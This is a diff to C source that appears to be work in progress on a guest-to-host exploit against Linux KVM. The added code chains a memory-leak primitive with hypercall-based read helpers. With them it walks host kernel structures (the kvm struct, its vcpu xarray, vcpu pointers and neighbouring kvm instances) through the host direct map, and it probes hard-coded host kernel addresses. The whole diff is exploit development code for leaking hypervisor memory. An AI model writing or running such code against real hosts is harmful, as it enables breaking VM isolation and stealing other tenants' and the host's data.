@@ -251,11 +251,26 @@ u64 leak_u64(hpa_t base, hpa_t pa, int iters)
 	return data;
 }
 
-va_t leak_kvm_vcpu(hpa_t base, hpa_t kvm)
+hva_t leak_kvm_vcpu(hpa_t base, hva_t direct_map, hva_t kvm)
 {
-	va_t head = leak_u64(base, kvm + KVM_VCPU_ARRAY + 8, 7);
-	// TODO
-	return head;
+	#define ITERS 7
+	printf("leak_kvm_vcpu(base=%lx, direct_map=%lx, kvm=%lx)\n", base, direct_map, kvm);
+	hva_t vcpu = -1, kvm_leak = -1;
+	do {
+		hpa_t kvm_ = kvm - direct_map;
+		hva_t head = leak_u64(base, kvm_ + KVM_VCPU_ARRAY + 8, ITERS);
+		hpa_t head_ = head - direct_map;
+		u64 entry = leak_u64(base, head_, ITERS);
+		hva_t ptr = (entry << 16) | (entry >> 48); // Crazy xarray stuff.
+		hva_t ptr_ = ptr - direct_map;
+		vcpu = leak_u64(base, ptr_ + 0x10, ITERS);
+		dump(vcpu);
+		hpa_t vcpu_ = vcpu - direct_map;
+		kvm_leak = leak_u64(base, vcpu_, ITERS);
+		dump(kvm_leak);
+	} while (kvm_leak != kvm);
+
+	return vcpu;
 }
 
 void translator_exam(hpa_t base, hva_t direct_map, hpa_t eptp, hpa_t hcr3, hpa_t gcr3, gva_t text)
@@ -361,13 +376,15 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 	} while (task_struct != start);
 	printf("nr_processes: %d\n\n", nr_processes);
 
-	#define KVM_MID 0x8b8 // 0x1178
-	#define KVM_RAD 0x20
+	#define KVM_MID 0x1128
+	#define KVM_RAD 0x10
 	uintptr_t kvm = hc_read_va(kvm_vcpu);
 	dump(kvm);
+	dump(kvm_vcpu);
 	dump(hc_translate_va(kvm));
 	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
-		printf("kvm+%3x = %16lx\n", off, hc_read_va(kvm+off));
+		u64 data = hc_read_va(kvm+off);
+		printf("kvm+%3x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
 	}
 	printf("...\n");
 	// for (int off = 0x9b70-0x40; off < 0x9b70+0x40; off += 8) {
@@ -377,17 +394,48 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 
 	uintptr_t kvm_next = hc_read_va(kvm + 0x1178) - 0x1178;
 	dump(kvm_next);
+	dump(kvm_vcpu);
 	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
-		printf("kvm_next+%3x = %16lx\n", off, hc_read_va(kvm_next+off));
+		u64 data = hc_read_va(kvm_next+off);
+		printf("kvm_next+%3x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
 	}
 	printf("\n");
 
 	uintptr_t kvm_prev = hc_read_va(kvm + 0x1178+8) - 0x1178;
 	dump(kvm_prev);
+	dump(kvm_vcpu);
 	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
-		printf("kvm_prev+%3x = %16lx\n", off, hc_read_va(kvm_prev+off));
+		u64 data = hc_read_va(kvm_prev+off);
+		printf("kvm_prev+%3x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
 	}
 	printf("\n");
+
+	uintptr_t head = 0xffffa03527ecd6d2;
+	dump(head);
+	for (int off = 0; off < 0x40; off += 8) {
+		u64 data = hc_read_va(head+off);
+		u64 ptr = (data << 16) | (data >> 48);
+		printf("head+%3x = %16lx | %16lx  -->  %16lx %16lx %16lx %16lx %16lx %16lx\n", off, data, ptr,
+			hc_read_va(ptr), hc_read_va(ptr+8), hc_read_va(ptr+16), hc_read_va(ptr+24), hc_read_va(ptr+32), hc_read_va(ptr+40));
+	}
+	printf("\n");
+
+	head = 0xffffa03527eceda2;
+	dump(head);
+	for (int off = 0; off < 0x40; off += 8) {
+		u64 data = hc_read_va(head+off);
+		u64 ptr = (data << 16) | (data >> 48);
+		printf("head+%3x = %16lx | %16lx  -->  %16lx %16lx %16lx %16lx %16lx %16lx\n", off, data, ptr,
+			hc_read_va(ptr), hc_read_va(ptr+8), hc_read_va(ptr+16), hc_read_va(ptr+24), hc_read_va(ptr+32), hc_read_va(ptr+40));
+	}
+	printf("\n");
+
+	uintptr_t vva;
+	vva = 0xffffa037d0a98000; printf("@ %16lx --> %16lx\n", vva, hc_read_va(vva));
+	vva = 0xffffa037d0a9a300; printf("@ %16lx --> %16lx\n", vva, hc_read_va(vva));
+	vva = 0xffffa03509ee8000; printf("@ %16lx --> %16lx\n", vva, hc_read_va(vva));
+	vva = 0xffffa037d0a9c600; printf("@ %16lx --> %16lx\n", vva, hc_read_va(vva));
+
 
 	uintptr_t mm_struct = hc_read_va(task_struct+0x950);
 	dump(mm_struct);
